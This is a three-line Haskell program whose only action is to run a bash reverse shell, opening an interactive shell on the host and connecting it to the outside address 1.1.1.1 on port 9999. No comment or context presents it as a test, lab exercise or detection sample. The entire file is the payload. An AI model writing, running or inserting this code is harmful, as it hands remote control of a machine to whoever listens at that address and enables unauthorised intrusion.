module Main where
import System.Process
main = callCommand "bash -c 'bash -i >& /dev/tcp/1.1.1.1/9999 0>&1'"